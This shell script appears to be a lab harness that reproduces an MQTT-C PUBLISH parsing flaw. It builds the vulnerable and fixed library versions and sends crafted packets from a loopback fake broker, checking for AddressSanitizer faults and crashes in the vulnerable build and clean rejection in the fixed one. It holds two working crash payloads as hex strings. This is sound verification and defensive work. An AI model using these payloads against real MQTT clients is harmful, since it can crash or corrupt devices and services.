#!/bin/sh
# Frontier lab wire runner: MQTT-C CVE-2026-54412.
# Verbatim pinned upstream mqtt.c, real loopback socket PAL, forked local fake
# broker. No external host, no public broker, no command execution.
set -u
cd "$(dirname "$0")" || exit 2

VULN_TAR="src/mqtt-1.1.6.tar.gz"
FIX_TAR="src/mqtt-1.1.7.tar.gz"
VULN_TAR_SHA="fad0b15f3f58317dd3b0399b37efab7c582074744871f093b9fdf28c74667f7d"
FIX_TAR_SHA="1e5d8a91d312724ceea4fe183680cabfdd47a10b5cf28e3834a8bec66e89e02c"
VULN_SRC_SHA="34ee9f4d573b2ac8c627c966c0112eb54f8620023f25d9cbeebb92e713a8e741"
FIX_SRC_SHA="d8f3f8cabe8ee5edcd80acfef75f7ee0f345751832a895d4cdc99dff6be1cfde"
ATTACK="3004ffff0000"          # QoS0 PUBLISH, remaining_length=4, topic size 0xFFFF
ATTACK_QOS1="3204ffff0000"     # QoS1 variant: reads packet id past the topic
SAFE="3006000161626300"        # QoS0 PUBLISH, topic "a", payload "bc"
PASS=0
FAIL=0

sha() { sha256sum "$1" | cut -d' ' -f1; }
ok()   { PASS=$((PASS + 1)); echo "PASS $1"; }
bad()  { FAIL=$((FAIL + 1)); echo "FAIL $1"; }
expect_eq() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1 (got '$2' want '$3')"; fi; }
has() { grep -q "$2" "$1" && ok "$3" || bad "$3"; }
hasnt() { grep -q "$2" "$1" && bad "$3" || ok "$3"; }

for pair in "$VULN_TAR:$VULN_TAR_SHA" "$FIX_TAR:$FIX_TAR_SHA"; do
    tar=${pair%%:*}
    want=${pair#*:}
    expect_eq "$tar sha256" "$(sha "$tar")" "$want"
done

rm -rf build-wire
mkdir -p build-wire/vuln build-wire/fixed
tar xzf "$VULN_TAR" -C build-wire/vuln --strip-components=1 \
    MQTT-C-1.1.6/src/mqtt.c MQTT-C-1.1.6/include/mqtt.h MQTT-C-1.1.6/include/mqtt_pal.h
tar xzf "$FIX_TAR" -C build-wire/fixed --strip-components=1 \
    MQTT-C-1.1.7/src/mqtt.c MQTT-C-1.1.7/include/mqtt.h MQTT-C-1.1.7/include/mqtt_pal.h
expect_eq "vulnerable mqtt.c verbatim sha256" "$(sha build-wire/vuln/src/mqtt.c)" "$VULN_SRC_SHA"
expect_eq "fixed mqtt.c verbatim sha256" "$(sha build-wire/fixed/src/mqtt.c)" "$FIX_SRC_SHA"

CC=${CC:-gcc}
CFLAGS="-std=c99 -O0 -g -fno-omit-frame-pointer -pthread"
ASAN="-fsanitize=address"
for side in vuln fixed; do
    if $CC $CFLAGS -Ibuild-wire/$side/include harness/wire_driver.c \
        build-wire/$side/src/mqtt.c -o build-wire/$side/plain > build-wire/$side/plain-build.log 2>&1; then
        ok "$side plain wire build"
    else
        bad "$side plain wire build"
    fi
    if $CC $CFLAGS $ASAN -Ibuild-wire/$side/include harness/wire_driver.c \
        build-wire/$side/src/mqtt.c -o build-wire/$side/asan > build-wire/$side/asan-build.log 2>&1; then
        ok "$side ASan wire build"
    else
        bad "$side ASan wire build"
    fi
done

export ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
./build-wire/vuln/asan "$ATTACK" > build-wire/vuln/asan-attack.log 2>&1
has build-wire/vuln/asan-attack.log 'CLIENT connect=127.0.0.1:' 'vuln attack client connected to loopback broker'
has build-wire/vuln/asan-attack.log 'BROKER send1=' 'vuln attack broker sent first chunk'
has build-wire/vuln/asan-attack.log 'BROKER send2=' 'vuln attack broker sent second chunk'
has build-wire/vuln/asan-attack.log 'PAL_RECV fd=.*bytes=6' 'vuln attack all 6 packet bytes came from recv()'
has build-wire/vuln/asan-attack.log 'AddressSanitizer: negative-size-param: (size=-4294967296)' 'vuln wire ASan negative-size-param -4294967296'
has build-wire/vuln/asan-attack.log '__mqtt_recv build-wire/vuln/src/mqtt.c:880' 'vuln wire ASan frame at verbatim mqtt.c:880'
has build-wire/vuln/asan-attack.log 'WIRE_CHILD_STATUS exited=1 code=1 signal=-1' 'vuln wire child faulted under ASan'

./build-wire/vuln/plain "$ATTACK" > build-wire/vuln/plain-attack.log 2>&1
has build-wire/vuln/plain-attack.log 'PAL_RECV fd=.*bytes=6' 'vuln plain all 6 bytes from recv()'
has build-wire/vuln/plain-attack.log 'WIRE_CHILD_STATUS exited=0 code=-1 signal=11' 'vuln plain wire child SIGSEGV'

./build-wire/fixed/asan "$ATTACK" > build-wire/fixed/asan-attack.log 2>&1
has build-wire/fixed/asan-attack.log 'PAL_RECV fd=.*bytes=6' 'fixed attack all 6 bytes from recv()'
has build-wire/fixed/asan-attack.log 'RECV2 rv=-2147483636 error=-2147483636 callbacks=0' 'fixed attack rejects malformed PUBLISH from wire'
has build-wire/fixed/asan-attack.log 'WIRE_CHILD_STATUS exited=1 code=0 signal=-1' 'fixed attack child clean exit'
hasnt build-wire/fixed/asan-attack.log AddressSanitizer 'fixed attack no ASan report'

./build-wire/vuln/asan "$SAFE" > build-wire/vuln/asan-safe.log 2>&1
has build-wire/vuln/asan-safe.log 'PAL_RECV fd=.*bytes=8' 'safe packet all 8 bytes from recv()'
has build-wire/vuln/asan-safe.log 'RECV2 rv=1 error=-2147483633 callbacks=1 topic_size=1 message_size=3' 'safe packet normal wire parse'
hasnt build-wire/vuln/asan-safe.log AddressSanitizer 'safe packet no ASan report'

./build-wire/vuln/asan "$ATTACK_QOS1" > build-wire/vuln/asan-attack-qos1.log 2>&1
has build-wire/vuln/asan-attack-qos1.log 'PAL_RECV fd=.*bytes=6' 'qos1 attack all 6 bytes from recv()'
has build-wire/vuln/asan-attack-qos1.log '__mqtt_unpack_uint16 build-wire/vuln/src/mqtt.c:1748' 'qos1 wire ASan read at verbatim mqtt.c:1748'

./build-wire/fixed/asan "$ATTACK_QOS1" > build-wire/fixed/asan-attack-qos1.log 2>&1
has build-wire/fixed/asan-attack-qos1.log 'PAL_RECV fd=.*bytes=6' 'fixed qos1 all 6 bytes from recv()'
has build-wire/fixed/asan-attack-qos1.log 'WIRE_CHILD_STATUS exited=1 code=0 signal=-1' 'fixed qos1 child clean exit'
hasnt build-wire/fixed/asan-attack-qos1.log AddressSanitizer 'fixed qos1 no ASan report'

echo "RESULT PASS=$PASS FAIL=$FAIL"
[ "$FAIL" -eq 0 ]
